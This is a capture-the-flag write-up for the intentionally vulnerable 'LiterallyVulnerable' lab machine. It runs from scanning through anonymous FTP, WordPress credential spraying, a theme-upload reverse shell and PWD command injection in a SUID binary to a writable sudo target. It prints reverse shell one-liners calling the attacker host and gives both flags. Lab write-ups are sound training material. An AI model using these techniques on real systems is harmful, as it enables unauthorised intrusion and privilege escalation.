# LiterallyVulnerable writeup

Let's start with a network scan
```bash
Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                         
                                                                                                                                                                                                              
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                             
 192.168.0.126   00:0c:29:3e:a9:83      1      60  VMware, Inc.
```
\
Next , scanning open ports
```bash
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 64
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
65535/tcp open  http syn-ack ttl 64
```
\
We first check the ftp port 
```bash
ftp 192.168.0.126
Connected to 192.168.0.126.
220 (vsFTPd 3.0.3)
Name (192.168.0.126:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||48431|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Dec 04  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Dec 04  2019 ..
-rw-r--r--    1 ftp      ftp           325 Dec 04  2019 backupPasswords
226 Directory send OK.
ftp> get backupPasswords
local: backupPasswords remote: backupPasswords
229 Entering Extended Passive Mode (|||45814|)
150 Opening BINARY mode data connection for backupPasswords (325 bytes).
100% |******************************************************************************************************************************************************************|   325       98.71 KiB/s    00:00 ETA
226 Transfer complete.
325 bytes received in 00:00 (85.47 KiB/s)
```
\
We found a file backupPasswords
```bash
cat backupPasswords 
Hi Doe, 

I'm guessing you forgot your password again! I've added a bunch of passwords below along with your password so we don't get hacked by those elites again!

*$eGRIf7v38s&p7
yP$*SV09YOrx7mY
GmceC&oOBtbnFCH
3!IZguT2piU8X$c
P&s%F1D4#KDBSeS
$EPid%J2L9LufO5
nD!mb*aHON&76&G
$*Ke7q2ko3tqoZo
SCb$I^gDDqE34fA
Ae%tM0XIWUMsCLp
```
\
After this , i tried to use these passwords to ssh as "doe" , but none of them worked.
\
So i accessed port 80 , which was a wordpress site
\
<img width="1368" height="780" alt="image" src="https://github.com/user-attachments/assets/fa67384b-c791-477c-ab62-001cf0d3dcd3" />
\
so i tried to use them in wordpress login , but didnt work , and the hint from author was "enumerate"
\
So i tried directory bruteforcing on port 80 and 65535 , and finally i got a lead
```bash
ffuf -u http://192.168.0.126:65535/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -r  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.126:65535/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

javascript              [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 2ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 0ms]
phpcms                  [Status: 200, Size: 44148, Words: 2180, Lines: 565, Duration: 394ms]
:: Progress: [29999/29999] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:05] :: Errors: 1 ::
```
\
When i accessed that directory 
\
<img width="1513" height="772" alt="image" src="https://github.com/user-attachments/assets/0738e076-448f-4f5a-82f7-16c50039c83b" />
\
Found that and also some notes
\
<img width="924" height="486" alt="image" src="https://github.com/user-attachments/assets/1c376d5b-ac07-4e49-a68c-d8763e777377" />
\
<img width="987" height="529" alt="image" src="https://github.com/user-attachments/assets/e1990de6-7707-4a7e-bcd4-79da979cfbbf" />
\
And on this , we use wpscan again , we see 2 users
```bash

[i] User(s) Identified:

[+] maybeadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] notadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```
\
So lets try those passwords here, i sent a sample request to intruder and then use those as wordlist 
\
<img width="1048" height="165" alt="image" src="https://github.com/user-attachments/assets/0b096c7b-570b-47e0-8af7-78339b79c893" />
\
So , we can see that with the combination maybeadmin:$EPid%J2L9LufO5 is giving a different response size , so we login with that pw
\
<img width="1678" height="702" alt="image" src="https://github.com/user-attachments/assets/0c740a03-b22f-4461-91ac-6a74b5e03b10" />
\
We see some activity on dashboard 
\
And when checked "secure post"
\
<img width="1116" height="576" alt="image" src="https://github.com/user-attachments/assets/e2358a5d-5ff2-473d-bb47-f4375f77101f" />
\
It gave password of user "notadmin" and from this user tab , we can see that "notadmin" is the administrator of the website
\
<img width="1514" height="477" alt="image" src="https://github.com/user-attachments/assets/3a73aa04-6b69-474a-8a62-39497277e730" />
\
So , we login as "notadmin" with the found password and i try to edit a theme file with a reverse shell payload , but doesnt work 
\
So i download a wordpress theme and replace content of a file like "404.php" with reverse shell payload and zip the folder and upload it into wordpress website and then activate it 
\
Now , we just access a page that shows 404 , and get our reverse shell
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from literallyvulnerable~192.168.0.126-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/literallyvulnerable~192.168.0.126-Linux-x86_64/2026_02_01-10_05_49-042.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@literallyvulnerable:/$ 
```
And after getting the shell , i check for users with bash 
```bash
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash
john:x:1000:1000:,,,:/home/john:/bin/bash
```
\
And , we see "doe" here , so lets try to use that password but its not the right one
\
We see a suid binary , so i check strings
```bash
strings /home/doe/itseasy
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
/bin/echo Your Path is: %s
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7697
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
itseasy.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
getenv@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
setresuid@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
setresgid@@GLIBC_2.2.5
system@@GLIBC_2.2.5
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
getegid@@GLIBC_2.2.5
__bss_start
asprintf@@GLIBC_2.2.5
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```
\
And , when i run it , it gives my path 
```bash
www-data@literallyvulnerable:/tmp$ /home/doe/itseasy
Your Path is: /tmp
```
\
And if we see the binary , it was using getenv , so i thought it was getting the value from "env"
```bash
env
APACHE_LOG_DIR=/var/log/apache2
LANG=C
OLDPWD=/home/doe
INVOCATION_ID=5222c9eb637040038a6a41f715834593
APACHE_LOCK_DIR=/var/lock/apache2
PWD=/tmp
JOURNAL_STREAM=9:318219
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
TERM=xterm-256color
SHELL=/bin/bash
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
```
\
So , after checking online , we understand that it is known as Environment path variable privilege escalation 
```bash
export PWD=\$\(/bin/bash\)
```
\
Now our Pwd becomes
```bash
PWD=$(/bin/bash)
```
\
And after running the binary again , we become john , but its not really a interactive terminal , so we get the output when we exit the bash 
\
But from the output , we know that  commands are running as user john
```bash
/home/doe/itseasy
john@literallyvulnerable:/tmp$ id
john@literallyvulnerable:/tmp$ exit
exit
Your Path is: uid=1000(john) gid=33(www-data) groups=33(www-data)
www-data@literallyvulnerable:$(/bin/bash)$ 
```
So i then try to get a reverse shell as john onto another port 
```bash
www-data@literallyvulnerable:$(/bin/bash)$ /home/doe/itseasy
john@literallyvulnerable:/tmp$ busybox nc 192.168.0.105 4445 -e /bin/sh
```
```bash
[+] Got reverse shell from literallyvulnerable~192.168.0.126-Linux-x86_64 😍 Assigned SessionID <2>
(Penelope)> interact2
[!] No such command: 'interact2'. Issue 'help' for all available commands
(Penelope)> interact 2
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/literallyvulnerable~192.168.0.126-Linux-x86_64/2026_02_01-10_33_13-915.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
john@literallyvulnerable:/tmp$ id
uid=1000(john) gid=33(www-data) groups=33(www-data)
john@literallyvulnerable:/tmp$ ls -la
total 12
drwxrwxrwt  2 root     root     4096 Feb  1 15:24 .
drwxr-xr-x 24 root     root     4096 Feb  1 14:48 ..
-rwxrwxrwx  1 www-data www-data   13 Feb  1 15:23 getenv
john@literallyvulnerable:/tmp$ 
```
\
Then , we get the user.txt flag
```bash
john@literallyvulnerable:/tmp$ cd ~
john@literallyvulnerable:/home/john$ ls -la
total 36
drwxr-xr-x 5 john john 4096 Dec  4  2019 .
drwxr-xr-x 4 root root 4096 Dec  4  2019 ..
lrwxrwxrwx 1 root root    9 Dec  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Dec  4  2019 .bash_logout
-rw-r--r-- 1 john john 3771 Dec  4  2019 .bashrc
drwx------ 2 john john 4096 Dec  4  2019 .cache
drwx------ 3 john john 4096 Dec  4  2019 .gnupg
drwxrwxr-x 3 john john 4096 Dec  4  2019 .local
-rw-r--r-- 1 john john  807 Dec  4  2019 .profile
-rw------- 1 john john  141 Dec  4  2019 user.txt
john@literallyvulnerable:/home/john$ cat user.txt 
Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;) 
Flag: iuz1498ne667ldqmfarfrky9v5ylki
```
\
So , when i was checking what all files did the user "john" have access to , i found something suspicious , a file "myPassword"
```bash
john@literallyvulnerable:/home/john$ find / -type f -user john -exec ls -l {} + 2>/dev/null
-rwsr-xr-x 1 john john     8632 Dec  4  2019 /home/doe/itseasy
-rw-r--r-- 1 john john      220 Dec  4  2019 /home/john/.bash_logout
-rw-r--r-- 1 john john     3771 Dec  4  2019 /home/john/.bashrc
-rw-r--r-- 1 john john        0 Dec  4  2019 /home/john/.cache/motd.legal-displayed
-rw-rw-r-- 1 john john      163 Dec  4  2019 /home/john/.local/share/tmpFiles/myPassword
-rw-r--r-- 1 john john      807 Dec  4  2019 /home/john/.profile
-rw------- 1 john john      141 Dec  4  2019 /home/john/user.txt
```
\
```bash
cat /home/john/.local/share/tmpFiles/myPassword
I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
am9objpZWlckczhZNDlJQiNaWko=
john@literallyvulnerable:/home/john$ echo "am9objpZWlckczhZNDlJQiNaWko=" | base64 -d
john:YZW$s8Y49IB#ZZJ
```
\
And , then with the found credentials , we ssh as john for a proper shell and then check sudo permissions 
```bash
john@literallyvulnerable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
john@literallyvulnerable:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on literallyvulnerable:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on literallyvulnerable:
    (root) /var/www/html/test.html
```
\
So i checked that file , but it doesnt exist , so i think about creating a reverse shell as that file and run as root 
```bash
www-data@literallyvulnerable:/var/www/html$ echo "busybox nc 192.168.0.105 4445 -e /bin/sh" > test.html
www-data@literallyvulnerable:/var/www/html$ chmod +x test.html 
www-data@literallyvulnerable:/var/www/html$ ls -la
total 32
drwxr-xr-x 3 www-data www-data  4096 Feb  1 15:40 .
drwxr-xr-x 4 root     root      4096 Dec  4  2019 ..
-rwxr-xr-x 1 www-data www-data 10918 Dec  4  2019 index.html
-rw-r--r-- 1 root     root       612 Feb  1 14:47 index.nginx-debian.html
drwxr-xr-x 5 www-data www-data  4096 Dec  4  2019 phpcms
-rwxrwxrwx 1 www-data www-data    41 Feb  1 15:40 test.html
```
\
And then we run the command
```bash
sudo -u root /var/www/html/test.html
```
\
And with a listener setup , we get root shell
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from literallyvulnerable~192.168.0.126-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/literallyvulnerable~192.168.0.126-Linux-x86_64/2026_02_01-10_42_05-035.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@literallyvulnerable:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@literallyvulnerable:~# cd /root
root@literallyvulnerable:/root# ls -la
total 40
drwx------  6 root root 4096 Dec  5  2019 .
drwxr-xr-x 24 root root 4096 Feb  1 14:48 ..
lrwxrwxrwx  1 root root    9 Dec  4  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Dec  5  2019 .cache
drwx------  3 root root 4096 Dec  5  2019 .gnupg
drwxr-xr-x  3 root root 4096 Dec  4  2019 .local
-rw-------  1 root root  299 Dec  4  2019 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root  883 Dec  4  2019 root.txt
drwx------  2 root root 4096 Dec  4  2019 .ssh
root@literallyvulnerable:/root# cat root.txt 
It was
 _     _ _                 _ _         _   _       _                      _     _      _ 
| |   (_) |               | | |       | | | |     | |                    | |   | |    | |
| |    _| |_ ___ _ __ __ _| | |_   _  | | | |_   _| |_ __   ___ _ __ __ _| |__ | | ___| |
| |   | | __/ _ \ '__/ _` | | | | | | | | | | | | | | '_ \ / _ \ '__/ _` | '_ \| |/ _ \ |
| |___| | ||  __/ | | (_| | | | |_| | \ \_/ / |_| | | | | |  __/ | | (_| | |_) | |  __/_|
\_____/_|\__\___|_|  \__,_|_|_|\__, |  \___/ \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|\___(_)
                                __/ |                                                    
                               |___/                                                     

Congrats, you did it! I hope it was *literally easy* for you! :) 
Flag: pabtejcnqisp6un0sbz0mrb3akaudk

Let me know, if you liked the machine @syed__umar
```
The End , thank you for reading till here
